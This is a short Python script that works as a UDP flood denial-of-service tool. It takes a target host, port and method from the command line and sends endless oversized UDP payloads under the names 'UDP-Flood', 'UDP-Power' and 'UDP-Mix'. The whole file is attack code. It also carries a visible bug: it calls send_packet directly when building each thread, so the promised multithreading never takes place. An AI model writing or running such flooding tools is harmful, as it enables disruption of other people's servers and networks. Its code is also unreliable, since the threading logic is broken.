import sys
import socket
import threading

host = str(sys.argv[1])
port = int(sys.argv[2])
method = str(sys.argv[3])
loops = 10000

def send_packet(amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True:
            s.send(b"\x200" * amplifier)
    except:
        return
    s.close()

def attack_HQ():
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(5243), daemon=True).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(7864), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(10486), daemon=True).start()
            threading.Thread(target=send_packet(5243), daemon=True).start()

attack_HQ()
